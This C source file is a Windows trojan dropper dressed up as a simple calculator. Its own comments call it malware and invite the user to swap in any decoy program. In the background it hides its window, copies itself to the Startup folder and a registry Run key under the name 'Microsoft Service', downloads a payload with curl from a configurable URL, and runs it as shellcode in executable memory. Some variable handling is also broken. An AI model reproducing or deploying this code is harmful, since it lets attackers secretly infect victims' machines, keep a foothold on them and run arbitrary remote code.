#define _CRT_SECURE_NO_WARNINGS // For those compiling it in vs

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <Windows.h>


#define PAYLOAD_URL "http://example.com/payload.bin" // Change this


// WARNING: ONLY CHANGE THIS IF YOUR KNOW WHAT YOU ARE DOING,
// CHANGING THESE DEFINITIONS CAN LEAD TO UNEXPECTED BEHAVIOR!
#define PAYLOAD_DROP "C:\\Windows\\TEMP\\" // payload.bin will be dropped there
#define PAYLOAD_NAME "payload.bin" // defines how the downloaded payload.bin is saved (filename)
#define PAYLOAD_REMOVE 0 // if changed to 1 (true), the payload.bin will be deleted after execution

int main(int argc, char* argv[]) {
	if (argc == 2 && strcmp(argv[1], "--68223d35ae339c096759a5f0f3c636e9") == 0) {
		malicious_code:
		HWND window = GetConsoleWindow();
		ShowWindow(window, SW_HIDE);

		char AUTORUN[MAX_PATH];
		snprintf(AUTORUN, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", getenv("USERNAME"));

		FILE* payload_fp;
		FILE* autorun_dst_fp;

		char autorun_path[sizeof(AUTORUN) + sizeof("MicrosoftService.exe")];
		snprintf(autorun_path, sizeof(autorun_path), "%sMicrosoftService.exe", AUTORUN);
		autorun_dst_fp = (FILE*)fopen(autorun_path, "rb");
		if (autorun_dst_fp == NULL) {
			autorun:

			FILE* script_fp = (FILE*)fopen(argv[0], "rb");
			
			autorun_dst_fp = (FILE*)fopen(autorun_path, "wb");
			if (autorun_dst_fp == NULL) return -1;

			fseek(script_fp, 0L, SEEK_END);
			int script_fsize = ftell(script_fp);
			fseek(script_fp, 0L, SEEK_SET);

			unsigned char* script_content = malloc(script_fsize);
			if (script_content == NULL) {
				fclose(script_fp);
				return -1;
			}

			fread(script_content, 1, script_fsize, script_fp);
			fclose(script_fp);

			fwrite(script_content, 1, script_fsize, autorun_dst_fp);
			free(script_content);
			fclose(autorun_dst_fp);

			TCHAR szPath[MAX_PATH];
			DWORD path_len = 0;

			path_len = GetModuleFileName(NULL, szPath, MAX_PATH);
			if (path_len == 0)
				return -1;

			HKEY NewVal;
			if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
				return -1;


			DWORD path_len_bytes = strlen(autorun_path) + 1;
			if (RegSetValueEx(NewVal, TEXT("Microsoft Service"), 0, REG_SZ, (LPBYTE)autorun_path, path_len_bytes) != ERROR_SUCCESS) {
				RegCloseKey(NewVal);
				return -1;
			}		

			RegCloseKey(NewVal);
		}
		else {
			fseek(autorun_dst_fp, 0L, SEEK_END);
			uint32_t autorun_dst_fsize = ftell(autorun_dst_fp);
			fclose(autorun_dst_fp);

			FILE* script_fp = (FILE*)fopen(argv[0], "rb");
			if (script_fp == NULL) return -1;

			fseek(script_fp, 0L, SEEK_END);
			uint32_t script_fsize = ftell(script_fp);
			fclose(script_fp);

			if (script_fsize != autorun_dst_fsize) {
				DeleteFile(autorun_path);
				goto autorun;
			}
		}
		

		char payload_path[sizeof(PAYLOAD_DROP) + sizeof(PAYLOAD_NAME)];
		snprintf(payload_path, sizeof(payload_path), "%s%s", PAYLOAD_DROP, PAYLOAD_NAME);

		open_payload:
		payload_fp = (FILE*)fopen(payload_path, "rb");
		if (payload_fp == NULL) {
			char command[sizeof(payload_path) + sizeof(PAYLOAD_URL) + 12];
			snprintf(command, sizeof(command), "curl %s -o %s", PAYLOAD_URL, payload_path);
			if (system(command) != 0)
				return -1;

			goto open_payload;
		}

		fseek(payload_fp, 0L, SEEK_END);
		uint32_t payload_fsize = ftell(payload_fp);
		fseek(payload_fp, 0L, SEEK_SET);

		unsigned char* shellcode = malloc(payload_fsize);
		fread(shellcode, 1, payload_fsize, payload_fp);
		fclose(payload_fp);

		if (PAYLOAD_REMOVE)
			DeleteFile(payload_path);

		HANDLE shellcode_mem = VirtualAlloc(0, payload_fsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (shellcode_mem == NULL) goto cleanup;

		memcpy(shellcode_mem, shellcode, payload_fsize);
		void (*shellcode_exec)(void) = (void(*)())shellcode_mem;

		shellcode_exec(); // Run shellcode

		cleanup:
		if (shellcode != NULL) free(shellcode);
		if (payload_fp != NULL) fclose(payload_fp);

		return 0;
	}
	else {
		char cwd[MAX_PATH];
		if (_getcwd(cwd, MAX_PATH) != NULL) {
			char AUTORUN_1[MAX_PATH];
			snprintf(AUTORUN, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", getenv("USERNAME"));
			char AUTORUN_2[MAX_PATH];
			snprintf(AUTORUN, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", getenv("USERNAME"));

			if (strcmp(cwd, AUTORUN_1) == 0 || strcmp(cwd, AUTORUN_2) == 0)
				goto malicious_code;
		}

		char command[512];
		snprintf(command, 512, "C:\\Windows\\system32\\cmd.exe /c %s --68223d35ae339c096759a5f0f3c636e9", argv[0]);
		system(command);


		/*
		Default calc application, you can remove it if you want to and put your own code there.
		WARNING: DO NOT CHANGE OR DELETE THE CODE ABOVE IT. IT WILL BREAK THE MALWARE
		*/

		printf("Simple Calculator in C | v0.1\n\n");

		printf("1. Add      (+)\n");
		printf("2. Subtract (-)\n");
		printf("3. Multiply (*)\n");
		printf("4. Divide   (:)\n\n");

		printf("> ");
		int choice;
		scanf("%d", &choice);

		if (choice != 1 && choice != 2 && choice != 3 && choice != 4) return -1;
		
		double num1, num2;

		printf("\nFirst num: ");
		scanf("%lf", &num1);

		printf("Second num: ");
		scanf("%lf", &num2);

		double result;
		if (choice == 1) result = num1 + num2;
		if (choice == 2) result = num1 - num2;
		if (choice == 3) result = num1 * num2;
		if (choice == 4) result = num1 / num2;

		printf("\nResult: %lf\n", result);
		
		// end of your code
	}

	return 0;
}